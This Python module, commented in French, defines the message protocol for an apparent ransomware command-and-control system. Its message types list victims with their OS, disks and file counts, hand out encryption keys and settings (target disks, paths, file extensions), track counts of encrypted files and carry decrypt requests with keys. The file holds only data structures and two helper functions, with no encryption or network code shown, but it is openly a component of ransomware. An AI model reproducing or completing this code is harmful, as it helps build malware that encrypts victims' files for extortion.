import copy
# Définition des messages
# List_victim messages
LIST_VICTIM_REQ = {'LIST_REQ': None}
LIST_VICTIM_RESP = {
    'LIST_RESP': None,
    'ID': None,
    'Hash': None,
    'OS': None,
    'DISKS': None,
    'STATE': None,
    'NB_FILES': None
}
LIST_VICTIM_END = {'LIST_END': None}

# history messages
HISTORY_REQ = {'HIST_REQ': None}
HISTORY_RESP = {
    'ID_STATES': None,
    'ID_VICTIM': None,
    'TIMESTAMP': None,
    'STATE': None
}
HISTORY_END = {'HIST_END': None}

# change_state message
CHANGE_STATE = {
    'CHGSTATE': None,
    'STATE': 'DECRYPT'
}

# initialize message
INITIALIZE_REQ = {
    'INITIALIZE': None,
    'OS': None,
    'DISKS': None
}
INITIALIZE_KEY = {
    'KEY_RESP': None,
    'KEY': None,
    'STATE': None
}
INITIALIZE_RESP = {
    'CONFIGURE': None,
    'SETTINGS': {
        'DISKS': None,
        'PATH': None,
        'FILE_EXT': None,
        'FREQ': None,
        'KEY': None,
        'STATE': None
    }
}
# pending signal
PENDING = {
    'PENDING_SIGNAL': None,
    'NB_FILES': None
}
# Decrypt message
DECRYPT_REQ = {
    'DECRYPT': None,
    'NB_FILES': None,
    'KEY': None
}
# Protected messages
PROTECTED_REQ = {
    'PROTECTREQ': None,
    'NB_FILES': None
}
COUNT_CRYPTED = {
    'COUNT': None,
    'NB_FILES': None
}
PROTECTED_RESP = {
    'PROTECTRESP': None,
    'MESSAGE': None
}

# message_type
MESSAGE_TYPE = {
    'LIST_REQ': LIST_VICTIM_REQ,
    'LIST_RESP': LIST_VICTIM_RESP,
    'LIST_END': LIST_VICTIM_END,
    'HIST_REQ': HISTORY_REQ,
    'HIST_RESP': HISTORY_RESP,
    'HIST_END': HISTORY_END,
    'CHGSTATE': CHANGE_STATE,
    'INITIALIZE': INITIALIZE_REQ,
    'KEY_RESP': INITIALIZE_KEY,
    'CONFIGURE': INITIALIZE_RESP,
    'PENDING_SIGNAL': PENDING,
    'DECRYPT': DECRYPT_REQ,
    'PROTECTREQ': PROTECTED_REQ,
    'COUNT': COUNT_CRYPTED,
    'PROTECTRESP': PROTECTED_RESP
}


def set_message(select_msg, params=None):
    """
    Retourne le dictionnaire correspondant à select_msg et le complète avec params si besoin.
    :param select_msg: le message à récupérer (ex: LIST_VICTIM_REQ)
    :param params: les éventuels paramètres à ajouter au message
    :return: le message sous forme de dictionnaire
    """
    msg = copy.deepcopy(MESSAGE_TYPE[select_msg])  # Créer une copie profonde du dictionnaire
    if msg is None:
        raise ValueError(f"Le message {select_msg} n'existe pas.")
    if params is not None:
        keys = list(msg.keys())
        for i, param in enumerate(params):
            if i < len(keys):
                msg[keys[i]] = param
            else:
                break
    return msg


def get_message_type(message):
    """
    Récupère le nom correspondant au type de message (ex: le dictionnaire LIST_VICTIM_REQ retourne 'LIST_REQ')
    :param message: le dictionnaire représentant le message
    :return: une chaine correspondant au nom du message comme définit par le protocole
    """
    return list(message.keys())[0]
